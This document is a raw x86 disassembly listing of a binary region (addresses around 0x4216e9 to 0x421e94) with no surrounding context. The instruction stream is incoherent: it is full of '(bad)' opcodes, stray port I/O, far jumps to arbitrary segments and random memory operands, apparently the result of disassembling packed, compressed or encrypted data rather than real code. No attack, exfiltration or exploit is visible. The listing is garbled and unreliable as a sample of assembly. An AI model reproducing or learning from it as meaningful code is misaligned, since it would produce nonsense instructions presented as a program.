  4216e9:	into   
  4216ea:	sub    eax,0xffffffd1
  4216ed:	les    edx,FWORD PTR [edx+0x73]
  4216f0:	xchg   edi,eax
  4216f1:	or     DWORD PTR [esi],ebx
  4216f3:	pop    ebx
  4216f4:	mov    al,ds:0x382dcbe1
  4216f9:	sar    DWORD PTR [ebx+0x36c4121],0x27
  421700:	jb     0x42173e
  421702:	inc    ecx
  421703:	and    dl,al
  421705:	xor    bh,BYTE PTR [edi+esi*4-0x4445d8a6]
  42170c:	xchg   edx,eax
  42170d:	mov    ds:0xdeb11209,eax
  421712:	and    BYTE PTR [edx-0x2a],cl
  421715:	mov    ebp,0xb31665d7
  42171a:	mov    ah,0xf0
  42171c:	pusha  
  42171d:	std    
  42171e:	push   esp
  42171f:	and    cl,BYTE PTR [edx-0x18]
  421722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421723:	mov    al,ds:0x5f885e66
  421728:	pop    ebp
  421729:	sbb    bl,BYTE PTR [esi-0xb92a6b9]
  42172f:	jg     0x421753
  421731:	test   eax,0xd8ed4901
  421736:	aaa    
  421737:	fcmovu st,st(6)
  421739:	arpl   WORD PTR [ecx+0x3b],dx
  42173c:	and    DWORD PTR [ebp-0x25],ebp
  42173f:	lahf   
  421740:	mov    ds:0xfe607f0a,al
  421745:	xchg   esp,eax
  421746:	adc    ebx,esi
  421748:	and    esi,DWORD PTR [edi-0x5ec02255]
  42174e:	adc    BYTE PTR [ecx+0x69],dl
  421751:	iret   
  421752:	pop    ss
  421753:	inc    edi
  421754:	mov    ah,0x31
  421756:	xchg   ebp,eax
  421757:	push   es
  421758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421759:	daa    
  42175a:	dec    ebx
  42175b:	inc    edx
  42175c:	sbb    DWORD PTR ds:0x9738f295,ebx
  421762:	jecxz  0x421789
  421764:	xchg   BYTE PTR [eax-0x32189dfc],ch
  42176a:	add    ebx,eax
  42176c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42176d:	stos   BYTE PTR es:[edi],al
  42176e:	push   ss
  42176f:	pop    ebp
  421770:	rsqrtps xmm7,XMMWORD PTR [ecx-0x21e6729b]
  421777:	call   0x9d28:0xb5ca143
  42177e:	mov    ds:0xd9ffd214,eax
  421783:	jne    0x421709
  421785:	cwde   
  421786:	and    al,0xba
  421788:	xchg   BYTE PTR ds:0x70e0240c,dh
  42178e:	cld    
  42178f:	lods   eax,DWORD PTR ds:[esi]
  421790:	push   ss
  421791:	xor    DWORD PTR [eax+edx*1],0x6c
  421795:	push   ds
  421796:	add    DWORD PTR [eax+ebp*2+0x46],ebx
  42179a:	add    al,0xa8
  42179c:	xchg   edi,eax
  42179d:	jne    0x421721
  42179f:	loopne 0x4217d5
  4217a1:	dec    esi
  4217a2:	or     al,0xf7
  4217a4:	add    dl,BYTE PTR [ebp-0x68]
  4217a7:	(bad)  
  4217a9:	push   cs
  4217aa:	cmp    DWORD PTR [eax],eax
  4217ac:	popa   
  4217ad:	sub    cl,dl
  4217af:	rcl    DWORD PTR [eax+edi*2],cl
  4217b2:	in     al,0x81
  4217b4:	sar    BYTE PTR [edx+0x20f13150],1
  4217ba:	mov    ch,0x1
  4217bc:	imul   eax,DWORD PTR [edx-0x611976b4],0xffffffc5
  4217c3:	in     eax,0x33
  4217c5:	adc    ah,BYTE PTR [edx]
  4217c7:	xchg   DWORD PTR [ebx-0x7e9de4b3],ebp
  4217cd:	and    DWORD PTR [edx+0x75db6259],ebx
  4217d3:	call   0x356f6065
  4217d8:	pop    DWORD PTR [ecx-0x5f]
  4217db:	xor    eax,0x39d49f11
  4217e0:	lea    esp,[eax+0x6d]
  4217e3:	xchg   ecx,eax
  4217e4:	mov    esi,0x1f70afa4
  4217e9:	xor    BYTE PTR [esi-0x59],0xa7
  4217ed:	adc    ecx,eax
  4217ef:	lahf   
  4217f0:	and    BYTE PTR [eax-0xee7a02d],0x19
  4217f7:	das    
  4217f8:	ss cs sub eax,0xe60e1ed0
  4217ff:	sahf   
  421800:	sbb    edx,DWORD PTR [eax]
  421802:	push   esi
  421803:	cmp    ebp,eax
  421805:	add    al,0x8b
  421807:	fcom   DWORD PTR [esi+0x78]
  42180a:	jns    0x421846
  42180c:	(bad)  
  42180d:	jne    0x42183c
  42180f:	fdivrp st(2),st
  421811:	xchg   esp,eax
  421812:	nop
  421813:	lahf   
  421814:	fmul   DWORD PTR [edi-0x5ec3a97a]
  42181a:	inc    ebx
  42181b:	add    ebp,DWORD PTR [eax]
  42181d:	dec    eax
  42181e:	inc    ecx
  42181f:	push   ecx
  421820:	mov    ds:0xae918daf,al
  421825:	sbb    eax,0x29722679
  42182a:	jl     0x4217e9
  42182c:	inc    eax
  42182d:	inc    esi
  42182e:	and    esi,DWORD PTR [ebx-0x4d]
  421831:	fnsave [ecx+0x3e492992]
  421837:	adc    edx,ebx
  421839:	cld    
  42183a:	ret    0xbf48
  42183d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42183f:	retf   
  421840:	pop    eax
  421841:	scas   eax,DWORD PTR es:[edi]
  421842:	cs and al,0xf8
  421845:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421846:	push   edx
  421847:	rcl    DWORD PTR [esi-0x24355cbb],1
  42184d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42184f:	iret   
  421850:	shl    DWORD PTR [ecx-0x6f],cl
  421853:	sub    esi,ebx
  421855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421856:	mov    ah,0xe4
  421858:	cmp    bl,al
  42185a:	int    0x3b
  42185c:	xchg   ebp,eax
  42185d:	adc    BYTE PTR [esi+0x6b],dh
  421860:	test   DWORD PTR [ecx+0x54],eax
  421863:	jmp    0x421865
	...
  421871:	ds inc esi
  421873:	dec    edx
  421874:	mov    ebp,0xc7ffbd7a
  421879:	popa   
  42187a:	dec    edi
  42187b:	push   ds
  42187c:	sbb    ebx,edi
  42187e:	mov    ds:0x91c5f6a3,al
  421883:	add    DWORD PTR [eax],eax
  421885:	stos   DWORD PTR es:[edi],eax
  421886:	add    eax,DWORD PTR [eax]
  421888:	add    BYTE PTR ds:0xcf013227,al
  42188e:	add    BYTE PTR [ecx+0x75],cl
  421891:	ja     0x4218ce
  421893:	aad    0x5c
  421895:	bound  eax,QWORD PTR [ebx]
  421897:	dec    ebx
  421898:	adc    al,0x9a
  42189a:	lea    ebx,[esi+0x195d9e47]
  4218a0:	push   ss
  4218a1:	cmp    edx,esp
  4218a3:	rcl    DWORD PTR [ebx-0x55],cl
  4218a6:	out    0xe7,eax
  4218a8:	js     0x421887
  4218aa:	ror    BYTE PTR [ebp+0x12],1
  4218ad:	test   BYTE PTR [edi],0xfb
  4218b0:	cs icebp 
  4218b2:	std    
  4218b3:	inc    ebp
  4218b4:	test   al,0xde
  4218b6:	cs cmp al,0xbe
  4218b9:	rcl    DWORD PTR [esi],1
  4218bb:	mov    ebx,0x45fb206
  4218c0:	pop    edi
  4218c1:	in     al,0x68
  4218c3:	out    0x8e,al
  4218c5:	add    al,0x5b
  4218c7:	push   esi
  4218c8:	jne    0x4218bf
  4218ca:	pop    esp
  4218cb:	pop    ecx
  4218cc:	mov    esi,0xf8c55eea
  4218d1:	inc    esi
  4218d2:	das    
  4218d3:	stos   BYTE PTR es:[edi],al
  4218d4:	sahf   
  4218d5:	shl    DWORD PTR [ecx],1
  4218d7:	bound  edi,QWORD PTR [edx+ebp*1]
  4218da:	sbb    bh,BYTE PTR [esi-0x55]
  4218dd:	fwait
  4218de:	push   0xe986b480
  4218e3:	ficomp WORD PTR [ebx+eiz*4]
  4218e6:	push   ds
  4218e7:	cmp    ebx,DWORD PTR [eax+0x10b6ce88]
  4218ed:	xor    BYTE PTR [edx-0x742c660f],ah
  4218f3:	aad    0xcb
  4218f5:	mul    DWORD PTR [ecx+0x45b81894]
  4218fb:	push   ebx
  4218fc:	loop   0x421974
  4218fe:	je     0x42193e
  421900:	xor    DWORD PTR [ebp-0x9],ecx
  421903:	xor    eax,eax
  421905:	push   ss
  421906:	sbb    DWORD PTR [ebx+ecx*8-0x68],ebp
  42190a:	ret    0x68ec
  42190d:	cdq    
  42190e:	(bad)  
  42190f:	lahf   
  421910:	inc    eax
  421911:	adc    edi,ebp
  421913:	push   esi
  421914:	pop    edi
  421915:	jae    0x421911
  421917:	scas   al,BYTE PTR es:[edi]
  421918:	sub    bh,BYTE PTR ds:0x8be2ff33
  42191e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42191f:	frstor [ebx]
  421921:	jns    0x4218aa
  421923:	out    0x4,eax
  421925:	mov    bh,dl
  421927:	sbb    BYTE PTR [ecx],cl
  421929:	in     al,0x76
  42192b:	cmp    eax,0x48adc5a3
  421930:	xchg   DWORD PTR [esi+eiz*8],esi
  421933:	add    bl,BYTE PTR [ebp+0x31aa2af0]
  421939:	mov    ds:0x2c8930e3,al
  42193e:	in     al,dx
  42193f:	push   ss
  421940:	out    0x40,al
  421942:	cmc    
  421943:	out    dx,al
  421944:	fs (bad) 
  421947:	xchg   esi,eax
  421948:	push   eax
  421949:	rcl    BYTE PTR [ecx-0x7baf5d71],0x27
  421950:	imul   eax,DWORD PTR [esi+0x40eec4c4],0x8452aab6
  42195a:	fiadd  DWORD PTR [esi-0x6e20aa93]
  421960:	jge    0x421979
  421962:	sub    eax,0x5187f696
  421967:	add    al,0xd1
  421969:	rol    DWORD PTR [edx+0x6f915abf],1
  42196f:	cs test al,bh
  421972:	dec    esp
  421973:	xchg   esp,eax
  421974:	jnp    0x4219e5
  421976:	imul   DWORD PTR [ebx]
  421978:	icebp  
  421979:	out    dx,al
  42197a:	pusha  
  42197b:	push   0xd5dda495
  421980:	call   0x3bc83820
  421985:	or     eax,0xc9010234
  42198a:	mov    edx,0x9004143c
  42198f:	retf   0x9bb2
  421992:	bswap  edx
  421994:	pop    ebx
  421995:	ins    DWORD PTR es:[edi],dx
  421996:	mov    al,0x21
  421998:	ss aad 0x6a
  42199b:	cld    
  42199c:	mov    ah,0x2
  42199e:	fxtract 
  4219a0:	(bad)  
  4219a1:	jbe    0x4219bc
  4219a3:	mov    ebx,0x3ac2acc9
  4219a8:	rcr    BYTE PTR [eax-0x17ac98aa],1
  4219ae:	es dec edx
  4219b0:	ins    BYTE PTR es:[edi],dx
  4219b1:	xchg   esi,eax
  4219b2:	pop    ecx
  4219b3:	adc    edx,DWORD PTR [ebx]
  4219b5:	cmp    DWORD PTR [edx-0x5a],eax
  4219b8:	sbb    esi,0xffffff88
  4219bb:	aas    
  4219bc:	cmp    eax,0x4561a574
  4219c1:	mov    ds:0xa8ed312a,al
  4219c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219c7:	leave  
  4219c8:	fist   WORD PTR [esp+ebp*1+0x67ee4228]
  4219cf:	push   ebp
  4219d0:	mov    BYTE PTR [edx+0x287d405d],dl
  4219d6:	int    0x46
  4219d8:	mov    cs,WORD PTR [ebx]
  4219da:	sbb    BYTE PTR ds:0xb810247a,0x5d
  4219e1:	pop    edi
  4219e2:	cmp    bh,BYTE PTR [eax]
  4219e4:	xor    BYTE PTR [ebx-0x689173ff],dl
  4219ea:	and    eax,0x1e054ae8
  4219ef:	mov    esp,0x70c29a45
  4219f4:	outs   dx,DWORD PTR ds:[esi]
  4219f5:	cmp    al,0xf0
  4219f7:	fild   DWORD PTR [ebx-0x2508e190]
  4219fd:	sbb    BYTE PTR [ecx+0xcffb96e],cl
  421a03:	jb     0x421a56
  421a05:	sbb    al,0x90
  421a07:	xchg   edi,eax
  421a08:	push   es
  421a09:	call   0x8448:0x9305841e
  421a10:	ss (bad) 
  421a12:	push   ds
  421a13:	pop    edx
  421a14:	cmp    cl,al
  421a16:	push   edx
  421a17:	jp     0x421a81
  421a19:	ret    0x296c
  421a1c:	call   0x41ac25ee
  421a21:	shr    DWORD PTR [edi-0x73],1
  421a24:	out    dx,eax
  421a25:	mov    dl,0xbd
  421a27:	jmp    0x6b2a6a5b
  421a2c:	outs   dx,DWORD PTR ds:[esi]
  421a2d:	mov    dl,0x72
  421a2f:	add    al,0x77
  421a31:	dec    ebp
  421a32:	or     ecx,ebp
  421a34:	(bad)  
  421a35:	mov    ch,0x8c
  421a37:	jns    0x421a93
  421a39:	daa    
  421a3a:	(bad)  [ecx+ecx*2-0x70e14891]
  421a41:	jno    0x421a4e
  421a43:	mov    ch,BYTE PTR [edx+0x5dd4db46]
  421a49:	sbb    DWORD PTR [ecx-0x21],esp
  421a4c:	push   ecx
  421a4d:	aas    
  421a4e:	lods   al,BYTE PTR ds:[esi]
  421a4f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a51:	aaa    
  421a52:	fisttp QWORD PTR [ecx+0x157daa5d]
  421a58:	sub    al,0xb7
  421a5a:	out    0x46,al
  421a5c:	and    eax,DWORD PTR [edi-0xe3ab626]
  421a62:	mov    gs,WORD PTR es:[ecx]
  421a65:	and    al,0x9f
  421a67:	loopne 0x421a96
  421a69:	sub    DWORD PTR [ebx-0x6d],esp
  421a6c:	cdq    
  421a6d:	jnp    0x421aa6
  421a6f:	xor    ebx,esi
  421a71:	(bad)  
  421a72:	mov    edi,0xf20f3075
  421a77:	popa   
  421a78:	repz scas al,BYTE PTR es:[edi]
  421a7a:	adc    al,0xcb
  421a7c:	clc    
  421a7d:	je     0x421ad5
  421a7f:	xor    eax,0xd90e3be4
  421a84:	mov    cs,WORD PTR [edi]
  421a86:	call   0xb90c:0xcdaf63d2
  421a8d:	jae    0x421aa8
  421a8f:	jmp    0xe776:0x732932b4
  421a96:	mov    ebp,0x66dfb7f0
  421a9b:	or     DWORD PTR [edi],ecx
  421a9d:	add    BYTE PTR [eax-0x24980139],ah
  421aa3:	xchg   esp,eax
  421aa4:	adc    bh,dh
  421aa6:	mov    ds:0xfd8b749c,al
  421aab:	xchg   al,al
  421aad:	mov    eax,0x55a35b75
  421ab2:	push   edx
  421ab3:	ret    
  421ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ab5:	push   edi
  421ab6:	lods   al,BYTE PTR ds:[esi]
  421ab7:	sub    eax,0x3833bed9
  421abc:	or     esi,DWORD PTR [esi]
  421abe:	dec    esi
  421abf:	fldcw  WORD PTR [edx-0x19]
  421ac2:	shl    DWORD PTR [edx+0x4c],0xd5
  421ac6:	stc    
  421ac7:	push   0xb
  421ac9:	icebp  
  421aca:	sub    eax,0x42f74036
  421acf:	inc    ecx
  421ad0:	or     esi,DWORD PTR [edi+0x548116f7]
  421ad6:	fisttp WORD PTR [ecx+ecx*2+0x3b]
  421ada:	outs   dx,BYTE PTR ds:[esi]
  421adb:	push   0x66b846ec
  421ae0:	and    dh,BYTE PTR [eax-0x56]
  421ae3:	mov    WORD PTR [esi+0x9],cs
  421ae6:	iret   
  421ae7:	jmp    0x36cf:0x786d1ffe
  421aee:	cmc    
  421aef:	icebp  
  421af0:	adc    DWORD PTR [ebx],eax
  421af2:	outs   dx,BYTE PTR ds:[esi]
  421af3:	fdiv   QWORD PTR [ecx]
  421af5:	bound  esp,QWORD PTR [eax]
  421af7:	je     0x421a9e
  421af9:	lods   eax,DWORD PTR ds:[esi]
  421afa:	(bad)  
  421afb:	inc    eax
  421afc:	mov    edi,0x5d2b0b3a
  421b01:	dec    esp
  421b02:	sahf   
  421b03:	mov    eax,0x57290aca
  421b08:	loopne 0x421ae7
  421b0a:	push   eax
  421b0b:	cmp    BYTE PTR [edi+0x24],0xf9
  421b0f:	leave  
  421b10:	inc    ebp
  421b11:	pusha  
  421b12:	(bad)  
  421b13:	mov    dh,0xa2
  421b15:	test   eax,0x9d4726cd
  421b1a:	jns    0x421b22
  421b1c:	aam    0x70
  421b1e:	cld    
  421b1f:	ror    DWORD PTR [ebp+edi*4+0x78],1
  421b23:	lahf   
  421b24:	ss push ebp
  421b26:	jns    0x421b21
  421b28:	fdivr  st,st(3)
  421b2a:	lds    esp,FWORD PTR [ecx+0x13bfae1d]
  421b30:	outs   dx,DWORD PTR ds:[esi]
  421b31:	lahf   
  421b32:	stos   DWORD PTR es:[edi],eax
  421b33:	loope  0x421bae
  421b35:	js     0x421b9a
  421b37:	clc    
  421b38:	pop    esp
  421b39:	cld    
  421b3a:	jmp    0x5cd:0xe8dd7354
  421b41:	inc    edi
  421b42:	(bad)  
  421b43:	cld    
  421b44:	js     0x421b39
  421b46:	pop    esp
  421b47:	(bad)  
  421b48:	and    BYTE PTR [ebp+0x181cce9c],dl
  421b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b4f:	pop    edx
  421b50:	mov    edx,DWORD PTR [eax+0x64]
  421b53:	sbb    dh,BYTE PTR cs:[eax+0x58]
  421b57:	mov    ds:0x5e15e1f,eax
  421b5c:	retf   0x84d0
  421b5f:	retf   
  421b60:	xchg   ebp,eax
  421b61:	cmc    
  421b62:	ret    0x915
  421b65:	dec    eax
  421b66:	in     al,0x76
  421b68:	(bad)  
  421b6a:	sti    
  421b6b:	dec    esi
  421b6c:	push   ds
  421b6d:	outs   dx,BYTE PTR ds:[esi]
  421b6e:	cmp    BYTE PTR [eax+esi*8+0x26156f31],cl
  421b75:	jl     0x421b4c
  421b77:	cld    
  421b78:	xchg   esi,eax
  421b79:	lds    ebp,FWORD PTR [ecx-0x39]
  421b7c:	jge    0x421b7d
  421b7e:	mov    esi,0x72496df5
  421b83:	mov    ah,0xd4
  421b85:	add    BYTE PTR [edi+0x14],dh
  421b88:	leave  
  421b89:	mov    BYTE PTR [esi+0x7d24fbff],cl
  421b8f:	bound  eax,QWORD PTR [eax]
  421b91:	(bad)  
  421b92:	jecxz  0x421b20
  421b94:	jns    0x421bf7
  421b96:	int3   
  421b97:	jno    0x421bbd
  421b99:	add    edi,DWORD PTR [ebx]
  421b9b:	jae    0x421be2
  421b9d:	push   edx
  421b9e:	xor    BYTE PTR [ecx],bh
  421ba0:	lahf   
  421ba1:	jbe    0x421bfc
  421ba3:	sbb    bh,cl
  421ba5:	dec    edx
  421ba6:	aam    0x3a
  421ba8:	and    edx,edx
  421baa:	nop
  421bab:	sub    cl,BYTE PTR [eax]
  421bad:	fstp   TBYTE PTR [esi-0x50]
  421bb0:	std    
  421bb1:	and    BYTE PTR [edx],bh
  421bb3:	mov    dh,0x9e
  421bb5:	lods   al,BYTE PTR ds:[esi]
  421bb6:	std    
  421bb7:	dec    ebx
  421bb8:	jp     0x421bd6
  421bba:	jg     0x421bb3
  421bbc:	fcmovnu st,st(2)
  421bbe:	inc    eax
  421bbf:	push   ebp
  421bc0:	dec    ebx
  421bc1:	rcl    BYTE PTR [ecx+ecx*1+0x2e9ad90d],cl
  421bc8:	xchg   BYTE PTR [ebx+0x18],bl
  421bcb:	push   es
  421bcc:	mov    cl,0xc8
  421bce:	cmp    ebp,ebp
  421bd0:	aad    0x4
  421bd2:	pop    edi
  421bd3:	inc    ebx
  421bd4:	adc    al,0x73
  421bd6:	mov    ch,0x9b
  421bd8:	(bad)  
  421bd9:	adc    dh,al
  421bdb:	xchg   edi,eax
  421bdc:	jo     0x421bfa
  421bde:	mov    al,ds:0x87a51ca2
  421be3:	cli    
  421be4:	(bad)  
  421be6:	jl     0x421c0d
  421be8:	das    
  421be9:	or     BYTE PTR [eax-0x6e],al
  421bec:	mov    ss,ebx
  421bee:	ret    0xa0f5
  421bf1:	dec    esp
  421bf3:	inc    edi
  421bf4:	mov    bl,0x7b
  421bf6:	pop    edi
  421bf7:	aaa    
  421bf8:	inc    ebp
  421bf9:	mov    al,0xbd
  421bfb:	es jg  0x421c22
  421bfe:	inc    ecx
  421bff:	fld    QWORD PTR [ecx]
  421c01:	and    DWORD PTR [ecx+esi*8+0x7702431a],ebp
  421c08:	mov    al,ds:0xf53453f
  421c0d:	test   eax,eax
  421c0f:	aam    0xc5
  421c11:	cmc    
  421c12:	outs   dx,DWORD PTR ds:[esi]
  421c13:	into   
  421c14:	fwait
  421c15:	inc    edi
  421c16:	inc    edi
  421c17:	outs   dx,BYTE PTR ds:[esi]
  421c18:	sar    BYTE PTR [ecx-0x25],1
  421c1b:	or     al,0xf4
  421c1d:	dec    ecx
  421c1e:	in     eax,dx
  421c1f:	cmp    bl,0xc6
  421c22:	divps  xmm0,XMMWORD PTR [ebp-0x56cd4159]
  421c29:	in     al,0xb4
  421c2b:	outs   dx,BYTE PTR ds:[esi]
  421c2c:	push   0x16e85115
  421c31:	push   cs
  421c32:	and    al,0x6f
	...
  421c40:	add    BYTE PTR [edx+eax*8],cl
  421c43:	xlat   BYTE PTR ds:[ebx]
  421c44:	and    bl,bh
  421c46:	aaa    
  421c47:	std    
  421c48:	out    dx,al
  421c49:	and    eax,0x6c971a56
  421c4e:	dec    edi
  421c4f:	int3   
  421c50:	inc    edx
  421c51:	jo     0x421be8
  421c53:	add    DWORD PTR [eax],eax
  421c55:	stos   DWORD PTR es:[edi],eax
  421c56:	add    eax,DWORD PTR [eax]
  421c58:	add    BYTE PTR [eax-0x67206b3a],dh
  421c5e:	or     eax,0x6e2f7ce3
  421c63:	mov    WORD PTR [ebx-0x4e960b04],es
  421c69:	mov    al,bh
  421c6b:	rol    DWORD PTR [ebx],cl
  421c6d:	cld    
  421c6e:	shl    DWORD PTR [ecx+0x6],cl
  421c71:	adc    al,0x99
  421c73:	mov    ch,0x1b
  421c75:	sar    BYTE PTR [ebp-0x225dafc9],1
  421c7b:	cwde   
  421c7c:	dec    ecx
  421c7d:	in     al,dx
  421c7e:	pop    ebp
  421c7f:	or     ah,BYTE PTR [ebp+0x15]
  421c82:	add    al,0xc2
  421c84:	lods   al,BYTE PTR ds:[esi]
  421c85:	mov    cl,0x11
  421c87:	jecxz  0x421c36
  421c89:	out    dx,eax
  421c8a:	js     0x421c4d
  421c8c:	inc    ebx
  421c8d:	push   ds
  421c8e:	pop    edx
  421c8f:	mov    ds:0x526c35cc,eax
  421c94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c95:	js     0x421cc6
  421c97:	les    ebx,FWORD PTR ds:0x63ec0b
  421c9d:	cmp    edi,DWORD PTR [ebx-0x1b]
  421ca0:	rcl    DWORD PTR ds:0x2aefe0ec,0xd9
  421ca7:	lods   al,BYTE PTR ds:[esi]
  421ca8:	add    ebx,DWORD PTR [esi+ebx*1+0x55]
  421cac:	adc    bh,BYTE PTR [edx+0x2b]
  421caf:	mov    ss,WORD PTR ds:0x7cfa2f52
  421cb5:	mov    ds:0x10e5263d,al
  421cba:	rcr    BYTE PTR [edx],0x2b
  421cbd:	retf   
  421cbe:	hlt    
  421cbf:	mov    ch,0xd
  421cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cc2:	pop    edx
  421cc3:	mov    al,ds:0xe39728b9
  421cc8:	es pop esp
  421cca:	lods   al,BYTE PTR ds:[esi]
  421ccb:	mov    al,0x41
  421ccd:	clc    
  421cce:	fldcw  WORD PTR [edx-0x60c444f1]
  421cd4:	push   edx
  421cd5:	jae    0x421ce7
  421cd7:	pop    eax
  421cd8:	mov    edi,0xee7a5dc6
  421cdd:	loope  0x421c69
  421cdf:	add    al,0x30
  421ce1:	mov    ebp,0xb02aba52
  421ce6:	xchg   esp,eax
  421ce7:	loope  0x421c7e
  421ce9:	fild   QWORD PTR [esi+esi*4-0x790f9e03]
  421cf0:	xor    eax,0xff1a6215
  421cf5:	pusha  
  421cf6:	ret    
  421cf7:	fcom   DWORD PTR [ebp+ebx*8-0x4e7f1c18]
  421cfe:	inc    ebx
  421cff:	cmp    ebp,DWORD PTR [eax+0x30]
  421d02:	dec    ecx
  421d03:	inc    ebx
  421d04:	enter  0x1c81,0x7a
  421d08:	stc    
  421d09:	call   FWORD PTR [ebx-0x44]
  421d0c:	push   ecx
  421d0d:	add    ebx,DWORD PTR [ebx+0x67]
  421d10:	jmp    0x21921961
  421d15:	dec    edi
  421d16:	mov    ecx,0xcc715e7d
  421d1b:	loop   0x421d99
  421d1d:	addr16 (bad) 
  421d1f:	(bad)
  421d22:	test   ah,ah
  421d24:	popf   
  421d25:	and    eax,0xe8c39760
  421d2a:	daa    
  421d2b:	out    0xfe,eax
  421d2d:	nop
  421d2e:	cmp    ebx,DWORD PTR [eax]
  421d30:	sbb    eax,0xe9aed579
  421d35:	mov    esp,0xf058a1e0
  421d3a:	and    al,0x85
  421d3c:	les    ebp,FWORD PTR [esi+0x50]
  421d3f:	icebp  
  421d40:	mov    ah,0xe4
  421d42:	and    ch,bh
  421d44:	or     ebp,DWORD PTR [esi+0x19b29e58]
  421d4a:	jge    0x421db0
  421d4c:	dec    esp
  421d4d:	in     eax,0x10
  421d4f:	or     al,0x54
  421d51:	dec    eax
  421d52:	jge    0x421d7f
  421d54:	in     al,0x5b
  421d56:	enter  0xdea0,0xc3
  421d5a:	pop    esi
  421d5b:	out    dx,al
  421d5c:	fdiv   DWORD PTR [edx-0x1e57635d]
  421d62:	push   edx
  421d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d64:	and    eax,0x8cb4aa13
  421d69:	sub    ecx,eax
  421d6b:	adc    BYTE PTR [edx-0x21],bh
  421d6e:	lea    ecx,[edx+0x61]
  421d71:	js     0x421d39
  421d73:	mov    esi,DWORD PTR [edx]
  421d75:	stos   DWORD PTR es:[edi],eax
  421d76:	sbb    eax,0xedee2a3c
  421d7b:	out    0xe2,ax
  421d7e:	mov    ch,0x3e
  421d80:	adc    eax,DWORD PTR [ebx]
  421d82:	dec    esi
  421d83:	cwde   
  421d84:	or     eax,0x24ff89c6
  421d89:	and    edi,ebp
  421d8b:	fdiv   st,st(3)
  421d8d:	cmc    
  421d8e:	test   BYTE PTR [eax],bl
  421d90:	xchg   ecx,eax
  421d91:	(bad)  
  421d92:	hlt    
  421d93:	push   esp
  421d94:	jle    0x421d6b
  421d96:	or     BYTE PTR [ebx+0x1033a9b9],bl
  421d9c:	push   cs
  421d9d:	and    BYTE PTR [eax],bl
  421d9f:	shl    DWORD PTR [edx],cl
  421da1:	sahf   
  421da2:	sub    eax,0x53759d32
  421da7:	jnp    0x421d3f
  421da9:	out    0x44,eax
  421dab:	or     BYTE PTR [eax+0xc7115e1],cl
  421db1:	mov    ah,0x2b
  421db3:	ficomp DWORD PTR [ebx]
  421db5:	(bad)  
  421db6:	push   edi
  421db7:	scas   eax,DWORD PTR es:[edi]
  421db8:	mov    ebx,0x5d8b6c1f
  421dbd:	sub    BYTE PTR [eax-0x69],dl
  421dc0:	or     al,0x7b
  421dc2:	push   ebp
  421dc3:	bound  ecx,QWORD PTR [ebx]
  421dc5:	jns    0x421de2
  421dc7:	lods   al,BYTE PTR ds:[esi]
  421dc8:	retf   
  421dc9:	aaa    
  421dca:	add    ch,bl
  421dcc:	and    DWORD PTR [ecx],ebx
  421dce:	adc    eax,DWORD PTR [ebx-0x8c968e4]
  421dd4:	inc    ebp
  421dd5:	enter  0x8ec0,0x36
  421dd9:	mov    bl,0x14
  421ddb:	inc    ecx
  421ddc:	mov    esp,0x763c4cc6
  421de1:	push   0xffffffe0
  421de3:	xchg   ebp,eax
  421de4:	inc    edx
  421de5:	clc    
  421de6:	sub    BYTE PTR [edi],bh
  421de8:	push   0xd87f2dbf
  421ded:	std    
  421dee:	jbe    0x421da5
  421df0:	sub    eax,0x6b73d4a3
  421df5:	or     edx,DWORD PTR [ecx+esi*2+0x7d918d2e]
  421dfc:	daa    
  421dfd:	dec    edi
  421dfe:	add    edx,eax
  421e00:	cwde   
  421e01:	aam    0x63
  421e03:	cli    
  421e04:	outs   dx,DWORD PTR ds:[esi]
  421e05:	or     DWORD PTR [eax-0x2eee6bcb],0xffffffd8
  421e0c:	pop    ebx
  421e0d:	out    0xce,al
  421e0f:	cmp    edi,DWORD PTR [edi]
  421e11:	xchg   ecx,eax
  421e12:	jle    0x421d9e
  421e14:	rol    BYTE PTR [edx+0x6558e3c8],0xc9
  421e1b:	sahf   
  421e1c:	lock (bad) 
  421e1e:	pop    ebx
  421e1f:	pushf  
  421e20:	push   0xfb155cfc
  421e25:	inc    eax
  421e26:	rol    BYTE PTR [ebx-0x2f51e45f],0xb2
  421e2d:	cmp    dh,bl
  421e2f:	xor    eax,0xd4220841
  421e34:	popf   
  421e35:	cmp    DWORD PTR [edx],ebp
  421e37:	inc    eax
  421e38:	sar    DWORD PTR [ecx],0x0
  421e3b:	hlt    
  421e3c:	cmp    DWORD PTR [edx-0x70fb04ed],edi
  421e42:	xlat   BYTE PTR ds:[ebx]
  421e44:	mov    ecx,0x6194f6ca
  421e49:	push   0x98d0a174
  421e4e:	fdivr  DWORD PTR [ecx-0x1b]
  421e51:	sbb    eax,0xce95ea36
  421e56:	sub    DWORD PTR [ecx+0x72e878ff],edi
  421e5c:	int3   
  421e5d:	test   BYTE PTR [ecx+0x330dca2b],dh
  421e63:	xchg   BYTE PTR [edx-0x2e],dl
  421e66:	in     eax,dx
  421e67:	xchg   esp,eax
  421e68:	mov    ebx,0x424eecfa
  421e6d:	push   ebx
  421e6e:	jbe    0x421e8d
  421e70:	cs xchg ebx,eax
  421e72:	xor    edi,DWORD PTR gs:[edi+0x3f]
  421e76:	xchg   DWORD PTR [esp+eax*8+0x43],edi
  421e7a:	pop    ecx
  421e7b:	aas    
  421e7c:	adc    DWORD PTR [eax-0x31],0x55
  421e80:	cmp    edx,DWORD PTR [edx-0x3f]
  421e83:	mov    eax,ds:0x9f9fc3c3
  421e88:	push   ecx
  421e89:	test   al,0x3e
  421e8b:	jbe    0x421eae
  421e8d:	rcr    esi,0xda
  421e90:	inc    edi
  421e91:	and    BYTE PTR [edi],ah
  421e93:	pop    esp
  421e94:	push   edx
